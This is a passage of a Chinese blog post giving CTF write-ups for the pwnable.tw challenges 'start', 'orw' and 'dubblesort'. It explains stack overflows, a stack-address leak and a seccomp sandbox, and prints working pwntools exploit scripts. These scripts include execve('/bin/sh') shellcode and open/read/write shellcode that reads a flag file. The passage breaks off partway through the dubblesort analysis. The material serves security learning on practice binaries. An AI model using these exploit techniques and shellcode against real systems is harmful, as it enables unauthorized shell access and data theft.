@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="CTF, pwn, pwnable.tw,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    pwnable.tw 部分题解 |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-pwnable.tw"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  pwnable.tw 部分题解
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/03/pwnable.tw/" class="article-date">
+  <time datetime="2020-03-09T16:00:00.000Z" itemprop="datePublished">2020-03-10</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">16 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p><a href="http://pwnable.tw" target="_blank" rel="noopener">pwnable.tw</a> 部分详细题解</p>
+<h2 id="1-start">1. start</h2>
+<p>点击 <a href="/2020/03/pwnable.tw/start" title="这里">这里</a> 下载题目</p>
+<h3 id="易知信息">易知信息</h3>
+<ul>
+<li>所有保护都被禁用</li>
+<li>有明显的栈溢出</li>
+<li><code>sys_read</code>和<code>sys_write</code>所操作的内存空间都是<code>esp</code>指向的位置</li>
+</ul>
+<h3 id="分析">分析</h3>
+<ul>
+<li>程序没有开启<code>NX</code>保护，所以我们可以通过写入并执行<code>shellcode</code>来获得<code>shell</code></li>
+<li>但在执行<code>shellcode</code>之前，我们需要先得到<code>esp</code>的具体值，从而计算出<code>shellcode</code>在栈上的具体地址
+<ul>
+<li>分析汇编代码和栈结构，我们可以发现，<code>old esp</code>被存到了栈的底部。</li>
+<li>所以只要我们将这个地址泄露出来，那么就可以得知栈顶地址。</li>
+<li>而当程序第一次<code>ret</code>后，<code>esp</code>就指向<code>old esp</code></li>
+<li>所以我们可以通过<code>ret</code>至<code>sys_write</code>，将<code>old esp</code>泄露，同时还可以进行二次栈溢出，写入并跳转至<code>shellcode</code>。</li>
+</ul>
+</li>
+</ul>
+<a id="more"></a>
+  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 第一次执行sys_write之前的栈空间结构</span><br><span class="line">pwndbg&gt; stack <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">esp</span>      <span class="number">0xffffd2c4</span> —&gt; <span class="number">0x2774654c</span> (<span class="string">"Let'"</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│          <span class="number">0xffffd2c8</span> —&gt; <span class="number">0x74732073</span> (<span class="string">'s st'</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│          <span class="number">0xffffd2cc</span> —&gt; <span class="number">0x20747261</span> (<span class="string">'art '</span>)</span><br><span class="line"><span class="number">03</span>:000c│          <span class="number">0xffffd2d0</span> —&gt; <span class="number">0x20656874</span> (<span class="string">'the '</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│          <span class="number">0xffffd2d4</span> —&gt; <span class="number">0x3a465443</span> (<span class="string">'CTF:'</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│          <span class="number">0xffffd2d8</span> —&gt; <span class="number">0x804809d</span> (_exit) —&gt; <span class="keyword">pop</span>    <span class="built_in">esp</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│ old <span class="built_in">esp</span>  <span class="number">0xffffd2dc</span> —&gt; <span class="number">0xffffd2e0</span> —&gt; <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:001c│          <span class="number">0xffffd2e0</span> —&gt; <span class="number">0x1</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│          <span class="number">0xffffd2e4</span> —&gt; <span class="number">0xffffd486</span> —&gt; <span class="string">'/root/Desktop/tmp/Pwn/start'</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│          <span class="number">0xffffd2e8</span> —&gt; <span class="number">0x0</span></span><br><span class="line">0a:<span class="number">0028</span>│          <span class="number">0xffffd2ec</span> —&gt; <span class="number">0xffffd4a2</span> —&gt; <span class="string">'CLUTTER_IM_MODULE=fcitx'</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<h3 id="解决方案">解决方案</h3>
+<ol>
+<li>构建并输入payload，通过缓冲区溢出漏洞，设置程序<code>ret</code>时跳转回<code>sys_write</code>，从而泄露<code>esp</code></li>
+<li>通过泄露出的<code>esp</code>，计算出<code>shellcode</code>的地址</li>
+<li>再次构建并输入payload, 设置栈上<code>old eip</code>为<code>shellcode</code>的地址，同时写入<code>shellcode</code></li>
+<li>程序<code>ret</code>时跳转到<code>shellcode</code>，成功<code>get shell</code>.</li>
+</ol>
+<h4 id="EXP">EXP</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">20</span> * <span class="string">"a"</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">io.sendafter(<span class="string">"the CTF:"</span>, payload)</span><br><span class="line">esp = io.recv()[:<span class="number">4</span>]</span><br><span class="line">payload = <span class="number">20</span> *<span class="string">"a"</span> + p32(u32(esp) + <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73"</span>\</span><br><span class="line">                   <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89"</span>\</span><br><span class="line">                   <span class="string">"\xe3\x89\xc1\x89\xc2\xb0\x0b"</span>\</span><br><span class="line">                   <span class="string">"\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="随笔">随笔</h3>
+<ul>
+<li>这是我见过最小的pwn题，但短小精悍，需要好好下一番功夫</li>
+</ul>
+<h3 id="参考">参考</h3>
+<blockquote>
+<p><a href="http://shell-storm.org/shellcode/files/shellcode-811.php" target="_blank" rel="noopener">Linux/x86 - execve(/bin/sh) - 28 bytes by Jean Pascal Pereira</a></p>
+</blockquote>
+<hr>
+<h2 id="2-ORW">2. ORW</h2>
+<p>Only open read write syscall are allowed to use.<br>
+点击 <a href="/2020/03/pwnable.tw/orw" title="这里">这里</a> 下载题目</p>
+<h3 id="易知信息-2">易知信息</h3>
+<ul>
+<li>可直接执行<code>shellcode</code></li>
+<li>只可使用 <code>sys_open</code> <code>sys_read</code> 和 <code>sys_write</code>（题目规定）</li>
+</ul>
+<h3 id="解决方案-2">解决方案</h3>
+<ul>
+<li>直接发送构造好的<code>shellcode</code>，获得<code>flag</code></li>
+</ul>
+<h4 id="EXP-2">EXP</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'x86'</span>)</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x0804A060</span> + <span class="number">0x60</span></span><br><span class="line">shellcode = asm(shellcraft.open(<span class="string">"/home/orw/flag"</span>))</span><br><span class="line">shellcode += asm(shellcraft.read(<span class="number">3</span>, buf, <span class="number">0x60</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, buf, <span class="number">0x60</span>))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">"Give my your shellcode:"</span>, shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="有趣的code">有趣的code</h3>
+<p>在刚看到题目时，有个问题一直在困扰着我 —— 题目要如何限制我不使用<code>sys_exec</code>呢？<br>
+直到我看到了这个函数</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [sp+4h] [bp-84h]@1</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [sp+8h] [bp-80h]@1</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+Ch] [bp-7Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+6Ch] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, <span class="number">0x60</span>u);</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以发现，这个函数内的核心语句为里面的两个<code>prctl</code>函数调用<br>
+而<code>prctl</code>是干什么用的呢？</p>
+<h4 id="prctl">prctl</h4>
+<p>通过查阅<code>Linux manual page</code>的相关信息，可以得出，这个函数是对进程做一些设置</p>
+<blockquote>
+<p>prctl - operations on a process<br>
+prctl() is called with a first argument describing what to do (with<br>
+values defined in &lt;linux/prctl.h&gt;), and further arguments with a<br>
+significance depending on the first one.</p>
+</blockquote>
+<p>函数原型为</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>通过查阅<code>/usr/include/linux/prctl.h</code>，我们可以得知题目里的两个枚举分别为<code>PR_SET_NO_NEW_PRIVS</code>和<code>PR_SET_SECCOMP</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  /usr/include/linux/prctl.h</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">* If no_new_privs is set, then operations that grant new privileges (i.e.</span></span><br><span class="line"><span class="comment">* execve) will either fail or not grant them.  This affects suid/sgid,</span></span><br><span class="line"><span class="comment">* file capabilities, and LSMs.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* Operations that merely manipulate or drop existing privileges (setresuid,</span></span><br><span class="line"><span class="comment">* capset, etc.) will still work.  Drop those privileges if you want them gone.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* Changing LSM security domain is considered a new privilege.  So, for example,</span></span><br><span class="line"><span class="comment">* asking selinux for a specific new context (e.g. with runcon) will result</span></span><br><span class="line"><span class="comment">* in execve returning -EPERM.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* See Documentation/userspace-api/no_new_privs.rst for more details.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PR_SET_NO_NEW_PRIVS 38</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set process seccomp mode */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PR_SET_SECCOMP 22</span></span><br></pre></td></tr></table></figure>
+<p>而这两个枚举有什么用呢，让我们一起查阅一下<code>Linux manual page</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NO_NEW_PRIVS (since Linux 3.5)</span><br><span class="line">    Set the calling thread&#39;s no_new_privs attribute to the value</span><br><span class="line">    in arg2.  With no_new_privs set to 1, execve(2) promises not</span><br><span class="line">    to grant privileges to do anything that could not have been</span><br><span class="line">    done without the execve(2) call.  Once set, this the</span><br><span class="line">    no_new_privs attribute cannot be unset.  The setting of this</span><br><span class="line">    attribute is inherited by children created by fork(2) and</span><br><span class="line">    clone(2), and preserved across execve(2).</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PR_SET_SECCOMP (since Linux 2.6.23)</span><br><span class="line">    Set the secure computing (seccomp) mode for the calling</span><br><span class="line">    thread, to limit the available system calls.  </span><br><span class="line"></span><br><span class="line">    The seccomp mode is selected via arg2.</span><br><span class="line"></span><br><span class="line">    With arg2 set to SECCOMP_MODE_STRICT, the only system calls</span><br><span class="line">    that the thread is permitted to make are read(2), write(2),</span><br><span class="line">    _exit(2) (but not exit_group(2)), and sigreturn(2).  Other</span><br><span class="line">    system calls result in the delivery of a SIGKILL signal.</span><br><span class="line"></span><br><span class="line">    With arg2 set to SECCOMP_MODE_FILTER (since Linux 3.5), the</span><br><span class="line">    system calls allowed are defined by a pointer to a Berkeley</span><br><span class="line">    Packet Filter passed in arg3.  This argument is a pointer to</span><br><span class="line">    struct sock_fprog; it can be designed to filter arbitrary sys‐</span><br><span class="line">    tem calls and system call arguments.</span><br></pre></td></tr></table></figure>
+<p>再看看与<code>PR_SET_SECCOMP</code>相关的枚举定义（位于<code>/usr/include/linux/seccomp.h</code>）：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  /usr/include/linux/seccomp.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Valid values for seccomp.mode and prctl(PR_SET_SECCOMP, &lt;mode&gt;) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECCOMP_MODE_DISABLED 0 <span class="comment">/* seccomp is not in use. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECCOMP_MODE_STRICT 1 <span class="comment">/* uses hard-coded filter. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECCOMP_MODE_FILTER 2 <span class="comment">/* uses user-supplied filter. */</span></span></span><br></pre></td></tr></table></figure>
+<p>通过以上信息，我们可以得出：</p>
+<ul>
+<li>
+<p>当<code>PR_SET_NO_NEW_PRIVS</code>被设置之后，如果<code>arg2</code>是<code>1</code>，那么我们就无法通过系统中断来调用<code>sys_exec</code>，同时这项设置还会<code>继承给子进程</code></p>
+</li>
+<li>
+<p>当<code>PR_SET_SECCOMP</code>被设置之后</p>
+<ul>
+<li>如果<code>arg2</code>是<code>SECCOMP_MODE_STRICT</code>,则当程序执行除<code>read</code>、<code>write</code>、<code>_exit</code>和<code>sigreturn</code>以为的指令时，将会收到<code>SIGKILL</code>信号</li>
+<li>如果<code>arg2</code>是<code>SECCOMP_MODE_FILTER</code>,则程序的系统调用规则将会设置为<code>arg3</code> <code>(sock_fprog结构体指针)</code> 指向的规则。该指针所指内存上的规则是基于<code>Berkeley Packet Filter</code> <code>（BPF）</code>沙箱规则。</li>
+</ul>
+</li>
+<li>
+<p>当前程序所执行的是</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;v1);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>如此，便限制住程序不能执行<code>sys_exec</code>.<br>
+至于关于<code>BPF</code>沙箱规则的分析，由于我水平有限，故暂时不做分析，等到以后水平提高了再战</p>
+<h3 id="参考-2">参考</h3>
+<ul>
+<li><a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">Linux Syscall Reference</a></li>
+<li><a href="http://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener">prctl(2) - Linux manual page</a></li>
+<li><a href="http://www.secwk.com/2019/09/20/6564/" target="_blank" rel="noopener">一道 CTF 题目学习 prctl 函数的沙箱过滤规则</a></li>
+</ul>
+<hr>
+<h2 id="3-dubblesort">3. dubblesort</h2>
+<p>Sort the memory!</p>
+<!--more-->
+<p>点击 <a href="/2020/03/pwnable.tw/dubblesort.zip" title="这里">这里</a> 下载题目</p>
+<h3 id="执行流程">执行流程</h3>
+<ol>
+<li>提示用户输入姓名</li>
+<li>将姓名输出</li>
+<li>提示用户输入即将输入数字的个数n</li>
+<li>提示用户输入n个数字</li>
+<li>对这些数进行<code>冒泡排序</code></li>
+<li>输出排序后的所有数字</li>
+</ol>
+<h3 id="易知信息-3">易知信息</h3>
+<ul>
+<li>保护全开（简直不要太惊喜）</li>
+<li>存在一个无法直接使用的栈溢出</li>
+</ul>
+<h3 id="分析前的操作">分析前的操作</h3>
+<p>题目给了一个libc出来，所以我们可以…</p>
+<ul>
+<li>
+<p>先查看该libc的<code>相关信息</code></p>
+<ul>
+<li>
+<p>先查看给出的libc的<code>版本</code>。通过输出信息可以得知该libc为 <code>Ubuntu GLIBC 2.23-0ubuntu5</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> root @ Kiprey <span class="keyword">in</span> ~/Desktop/Pwn [20:56:20]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./libc_32.so.6</span></span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>再查看给出的libc的<code>位数</code> 。 通过输出信息可得知为<code>32位</code>（这一步可做可不做，因为方法太多了，无论是直接查看还是间接查看）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> root @ Kiprey <span class="keyword">in</span> ~/Desktop/Pwn [20:57:02]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> file libc_32.so.6</span></span><br><span class="line">libc_32.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d26149b8dc15c0c3ea8a5316583757f69b39e037, for GNU/Linux 2.6.32, stripped</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>再修改可执行文件<code>header</code>里的<code>ld path</code>和<code>libc path</code>为指定的文件（点击<a href="/2020/03/pwnable.tw/x86_ld-2.23.so.2" title="x86_ld-2.23.so.2">x86_ld-2.23.so.2</a>下载<code>ld</code>文件）<br>
+<strong>使该可执行文件强制使用给定的<code>libc</code></strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置可执行文件使用的ld链接器为指定的ld （ld版本必须和libc的版本一致！！！）</span></span><br><span class="line">patchelf --set-interpreter /root/Desktop/Pwn/tmp/x86_ld-2.23.so.2 dubblesort</span><br><span class="line"><span class="meta">#</span><span class="bash"> 替换可执行文件使用的libc为指定的libc</span></span><br><span class="line">patchelf --replace-needed libc.so.6 /root/Desktop/Pwn/libc_32.so.6 dubblesort</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>最后查看是否修改成功</p>
+<ul>
+<li>
+<p>第一种方法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> root @ Kiprey <span class="keyword">in</span> ~/Desktop/Pwn [23:55:46]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldd dubblesort</span></span><br><span class="line">        linux-gate.so.1 (0xf7fba000)</span><br><span class="line">        /root/Desktop/Pwn/libc_32.so.6 (0xf7dfc000)</span><br><span class="line">        /root/Desktop/Pwn/tmp/x86_ld-2.23.so.2 =&gt; /lib/ld-linux.so.2 (0xf7fbb000)</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>第二种方法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> root @ Kiprey <span class="keyword">in</span> ~/Desktop/Pwn [23:57:28] C:130</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> readelf -d dubblesort</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xea8 contains 27 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line">0x00000001 (NEEDED)                     Shared library: [/root/Desktop/Pwn/libc_32.so.6]</span><br><span class="line">0x0000000c (INIT)                       0x5f8</span><br><span class="line">0x0000000d (FINI)                       0xbb4</span><br><span class="line">0x00000019 (INIT_ARRAY)                 0x1e9c</span><br><span class="line">0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x0000001a (FINI_ARRAY)                 0x1ea0</span><br><span class="line">0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x6ffffef5 (GNU_HASH)                   0x1ac</span><br><span class="line">0x00000005 (STRTAB)                     0x3000</span><br><span class="line">0x00000006 (SYMTAB)                     0x1e0</span><br><span class="line">0x0000000a (STRSZ)                      358 (bytes)</span><br><span class="line">0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line">0x00000015 (DEBUG)                      0x0</span><br><span class="line">0x00000003 (PLTGOT)                     0x1fa0</span><br><span class="line">0x00000002 (PLTRELSZ)                   112 (bytes)</span><br><span class="line">0x00000014 (PLTREL)                     REL</span><br><span class="line">0x00000017 (JMPREL)                     0x588</span><br><span class="line">0x00000011 (REL)                        0x538</span><br><span class="line">0x00000012 (RELSZ)                      80 (bytes)</span><br><span class="line">0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line">0x00000018 (BIND_NOW)</span><br><span class="line">0x6ffffffb (FLAGS_1)                    Flags: NOW</span><br><span class="line">0x6ffffffe (VERNEED)                    0x4d8</span><br><span class="line">0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line">0x6ffffff0 (VERSYM)                     0x4a8</span><br><span class="line">0x6ffffffa (RELCOUNT)                   4</span><br><span class="line">0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="分析-2">分析</h3>
+<ul>
+<li>
+<p><code>main</code>函数里读取<code>name</code>用的是<code>read</code>函数，在下一行还会输出<code>name</code>。<br>
+所以我们可以输入一个无<code>\0</code>结尾的字符串，从而在下一行<code>scanf</code>时，将栈上数据泄露出来</p>
